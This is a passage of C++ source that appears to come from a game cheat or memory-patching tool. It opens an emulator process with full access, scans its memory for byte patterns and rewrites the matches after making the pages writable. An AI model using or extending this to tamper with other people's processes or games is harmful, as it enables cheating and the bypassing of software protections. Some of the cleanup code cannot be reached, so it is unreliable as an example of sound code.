            //MemoryLogs = type + ": An unexpected error occurred";;

            bool Status = ReplacePattern(dwStartRange, dwEndRange, Search, Replace);


        CloseHandle(ProcessHandle);
    }

    BOOL AttackProcess(const char* procname)
    {
        DWORD ProcId = GetPid(GetEmulatorRunning());
        if (ProcId == 0)
            return false;

        ProcessId = ProcId;
        ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, ProcessId);
        return ProcessHandle != nullptr;
    }

    bool ReplacePattern(DWORD_PTR dwStartRange, DWORD_PTR dwEndRange, BYTE* SearchAob, BYTE* ReplaceAob)
    {
        int RepByteSize = _msize(ReplaceAob);
        if (RepByteSize <= 0) return false;
        std::vector<DWORD_PTR> foundedAddress;
        FindPattern(dwStartRange, dwEndRange, SearchAob, foundedAddress);
        if (foundedAddress.empty())
            return false;

        DWORD OldProtect;
        for (int i = 0; i < foundedAddress.size(); i++)
        {
            ZwProtectVirtualMemory(ProcessHandle, (LPVOID)foundedAddress[i], RepByteSize, PAGE_EXECUTE_READWRITE, &OldProtect);
            ZwWriteVirtualMemory(ProcessHandle, (LPVOID)foundedAddress[i], ReplaceAob, RepByteSize, 0);
            ZwProtectVirtualMemory(ProcessHandle, (LPVOID)foundedAddress[i], RepByteSize, PAGE_EXECUTE_READ, &OldProtect);
        }

        return true;
    }


    bool ChangePattern(DWORD_PTR dwStartRange, DWORD_PTR dwEndRange, BYTE* Search, BYTE* Replace)
    {
        if (!AttackProcess(GetEmulatorRunning())) return false;

        bool Status = ReplacePattern(dwStartRange, dwEndRange, Search, Replace);
        if (Status) return true;
        else return false;

        CloseHandle(ProcessHandle);
    }

    bool HookPattern(DWORD_PTR dwStartRange, DWORD_PTR dwEndRange, BYTE* SearchAob, BYTE* ReplaceAob, std::vector<DWORD_PTR>& AddressRet)
    {
        if (!AttackProcess(GetEmulatorRunning())) return false;
        int RepByteSize = _msize(ReplaceAob);
        if (RepByteSize <= 0) return false;

        if (AddressRet.empty())
        {
            FindPattern(dwStartRange, dwEndRange, SearchAob, AddressRet);
            if (AddressRet.empty()) return false;

            DWORD OldProtect;
            for (int i = 0; i < AddressRet.size(); i++)
            {
                WriteProcessMemory(ProcessHandle, (LPVOID)AddressRet[i], ReplaceAob, RepByteSize, 0);
            }

            return true;
        }
        else {
            DWORD OldProtect;
            for (int i = 0; i < AddressRet.size(); i++)
            {
                WriteProcessMemory(ProcessHandle, (LPVOID)AddressRet[i], ReplaceAob, RepByteSize, 0);
            }
            return true;
        }
        CloseHandle(ProcessHandle);
    }

    std::vector<BYTE> IntToByteArray(int value)
    {
        std::vector<BYTE> byteArray(sizeof(value));
        BYTE* pValue = reinterpret_cast<BYTE*>(&value);

        for (size_t i = 0; i < sizeof(value); ++i)
        {
            byteArray[i] = pValue[i];
        }

        return byteArray;
    }
    bool FindPattern(DWORD_PTR StartRange, DWORD_PTR EndRange, BYTE* SearchBytes, std::vector<DWORD_PTR>& AddressRet)
    {

        BYTE* pCurrMemoryData = NULL;
        MEMORY_BASIC_INFORMATION	mbi;
        std::vector<MEMORY_REGION> m_vMemoryRegion;
        mbi.RegionSize = 0x1000;



        DWORD_PTR dwAddress = StartRange;
        DWORD_PTR nSearchSize = _msize(SearchBytes);


        while (VirtualQueryEx(ProcessHandle, (LPCVOID)dwAddress, &mbi, sizeof(mbi)) && (dwAddress < EndRange) && ((dwAddress + mbi.RegionSize) > dwAddress))
        {

            if ((mbi.State == MEM_COMMIT) && ((mbi.Protect & PAGE_GUARD) == 0) && (mbi.Protect != PAGE_NOACCESS) && ((mbi.AllocationProtect & PAGE_NOCACHE) != PAGE_NOCACHE))
            {

                MEMORY_REGION mData = { 0 };
                mData.dwBaseAddr = (DWORD_PTR)mbi.BaseAddress;
                mData.dwMemorySize = mbi.RegionSize;
                m_vMemoryRegion.push_back(mData);

            }
            dwAddress = (DWORD_PTR)mbi.BaseAddress + mbi.RegionSize;

        }

        std::vector<MEMORY_REGION>::iterator it;
        for (it = m_vMemoryRegion.begin(); it != m_vMemoryRegion.end(); it++)
        {
            MEMORY_REGION mData = *it;


            DWORD_PTR dwNumberOfBytesRead = 0;
            pCurrMemoryData = new BYTE[mData.dwMemorySize];
            ZeroMemory(pCurrMemoryData, mData.dwMemorySize);
            ZwReadVirtualMemory(ProcessHandle, (LPVOID)mData.dwBaseAddr, pCurrMemoryData, mData.dwMemorySize, &dwNumberOfBytesRead);
            if ((int)dwNumberOfBytesRead <= 0)
            {
                delete[] pCurrMemoryData;
                continue;
            }
            DWORD_PTR dwOffset = 0;
            int iOffset = Memfind(pCurrMemoryData, dwNumberOfBytesRead, SearchBytes, nSearchSize);
            while (iOffset != -1)
            {
                dwOffset += iOffset;
                AddressRet.push_back(dwOffset + mData.dwBaseAddr);
                dwOffset += nSearchSize;
                iOffset = Memfind(pCurrMemoryData + dwOffset, dwNumberOfBytesRead - dwOffset - nSearchSize, SearchBytes, nSearchSize);
            }

            if (pCurrMemoryData != NULL)
            {
                delete[] pCurrMemoryData;
                pCurrMemoryData = NULL;
            }

        }
        return TRUE;
    }




    int Memfind(BYTE* buffer, DWORD_PTR dwBufferSize, BYTE* bstr, DWORD_PTR dwStrLen) {
        if (dwBufferSize < 0) {
            return -1;
        }
        DWORD_PTR  i, j;
        for (i = 0; i < dwBufferSize; i++) {
            for (j = 0; j < dwStrLen; j++) {
                if (buffer[i + j] != bstr[j] && bstr[j] != '?')
                    break;

            }
            if (j == dwStrLen)
                return i;
        }
        return -1;
    }
};


#pragma once
